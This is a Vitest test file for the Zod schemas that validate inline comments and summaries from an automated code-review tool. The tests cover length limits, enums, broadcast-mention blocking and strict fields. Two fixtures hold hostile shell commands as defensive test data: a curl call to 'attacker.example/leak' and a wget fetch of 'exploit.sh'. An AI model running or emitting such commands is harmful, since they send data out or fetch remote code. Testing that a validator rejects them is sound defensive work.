import { describe, expect, it } from 'vitest';
import { InlineCommentSchema, ReviewOutputSchema } from './schemas.js';

const validComment = {
  path: 'src/auth.ts',
  line: 10,
  side: 'RIGHT' as const,
  severity: 'major' as const,
  title: 'Password is logged in plaintext',
  body: 'Avoid logging secrets. Use a redaction layer instead.',
  suggestion: 'logger.info({ user: user.id });',
  category: 'security',
};

describe('InlineCommentSchema', () => {
  it('accepts a well-formed comment', () => {
    expect(InlineCommentSchema.safeParse(validComment).success).toBe(true);
  });

  it('accepts null suggestion', () => {
    const result = InlineCommentSchema.safeParse({ ...validComment, suggestion: null });
    expect(result.success).toBe(true);
  });

  it('rejects non-positive line number', () => {
    expect(InlineCommentSchema.safeParse({ ...validComment, line: 0 }).success).toBe(false);
    expect(InlineCommentSchema.safeParse({ ...validComment, line: -1 }).success).toBe(false);
  });

  it('rejects fractional line number', () => {
    expect(InlineCommentSchema.safeParse({ ...validComment, line: 1.5 }).success).toBe(false);
  });

  it('rejects unknown side value', () => {
    expect(InlineCommentSchema.safeParse({ ...validComment, side: 'CENTER' }).success).toBe(false);
  });

  it('rejects unknown severity value', () => {
    expect(InlineCommentSchema.safeParse({ ...validComment, severity: 'blocker' }).success).toBe(
      false,
    );
  });

  it('rejects empty title', () => {
    expect(InlineCommentSchema.safeParse({ ...validComment, title: '' }).success).toBe(false);
  });

  it('rejects oversized title (>200 chars)', () => {
    const huge = 'x'.repeat(201);
    expect(InlineCommentSchema.safeParse({ ...validComment, title: huge }).success).toBe(false);
  });

  it('rejects oversized body (>4000 chars)', () => {
    const huge = 'x'.repeat(4001);
    expect(InlineCommentSchema.safeParse({ ...validComment, body: huge }).success).toBe(false);
  });

  it('rejects @everyone broadcast mention in body', () => {
    const result = InlineCommentSchema.safeParse({
      ...validComment,
      body: 'Hey @everyone please look at this',
    });
    expect(result.success).toBe(false);
  });

  it('rejects @channel broadcast mention in title', () => {
    const result = InlineCommentSchema.safeParse({
      ...validComment,
      title: 'Notify @channel about regression',
    });
    expect(result.success).toBe(false);
  });

  it('rejects @here broadcast mention in suggestion', () => {
    const result = InlineCommentSchema.safeParse({
      ...validComment,
      suggestion: '@here please rebase',
    });
    expect(result.success).toBe(false);
  });

  it('rejects shell command (curl http) in body', () => {
    const result = InlineCommentSchema.safeParse({
      ...validComment,
      body: 'Run `curl http://attacker.example/leak` to verify.',
    });
    expect(result.success).toBe(false);
  });

  it('rejects shell command (wget https) in body', () => {
    const result = InlineCommentSchema.safeParse({
      ...validComment,
      body: 'Try wget https://example.com/exploit.sh',
    });
    expect(result.success).toBe(false);
  });

  it('allows mentions of regular users', () => {
    const result = InlineCommentSchema.safeParse({
      ...validComment,
      body: 'cc @alice — thoughts?',
    });
    expect(result.success).toBe(true);
  });

  it('allows curl mentioned without an HTTP URL', () => {
    const result = InlineCommentSchema.safeParse({
      ...validComment,
      body: 'Use curl to test this endpoint locally.',
    });
    expect(result.success).toBe(true);
  });

  it('rejects unknown extra fields (strict mode)', () => {
    const result = InlineCommentSchema.safeParse({ ...validComment, extra: 'oops' });
    expect(result.success).toBe(false);
  });

  it('rejects empty path', () => {
    expect(InlineCommentSchema.safeParse({ ...validComment, path: '' }).success).toBe(false);
  });

  it('rejects empty category', () => {
    expect(InlineCommentSchema.safeParse({ ...validComment, category: '' }).success).toBe(false);
  });
});

describe('ReviewOutputSchema', () => {
  it('accepts valid output with empty comments', () => {
    const result = ReviewOutputSchema.safeParse({
      summary: 'No issues found.',
      comments: [],
    });
    expect(result.success).toBe(true);
  });

  it('accepts valid output with multiple comments', () => {
    const result = ReviewOutputSchema.safeParse({
      summary: 'Two issues identified.',
      comments: [validComment, { ...validComment, line: 20 }],
    });
    expect(result.success).toBe(true);
  });

  it('rejects empty summary', () => {
    const result = ReviewOutputSchema.safeParse({
      summary: '',
      comments: [],
    });
    expect(result.success).toBe(false);
  });

  it('rejects broadcast mention in summary', () => {
    const result = ReviewOutputSchema.safeParse({
      summary: '@everyone — review this',
      comments: [],
    });
    expect(result.success).toBe(false);
  });

  it('rejects oversized summary (>8000 chars)', () => {
    const result = ReviewOutputSchema.safeParse({
      summary: 'x'.repeat(8001),
      comments: [],
    });
    expect(result.success).toBe(false);
  });

  it('rejects more than 100 comments', () => {
    const many = Array.from({ length: 101 }, (_, i) => ({ ...validComment, line: i + 1 }));
    const result = ReviewOutputSchema.safeParse({
      summary: 'Too many findings',
      comments: many,
    });
    expect(result.success).toBe(false);
  });

  it('rejects unknown extra fields (strict mode)', () => {
    const result = ReviewOutputSchema.safeParse({
      summary: 'ok',
      comments: [],
      extra: 'nope',
    });
    expect(result.success).toBe(false);
  });

  it('propagates per-comment validation failures', () => {
    const result = ReviewOutputSchema.safeParse({
      summary: 'ok',
      comments: [{ ...validComment, body: '@everyone' }],
    });
    expect(result.success).toBe(false);
  });
});
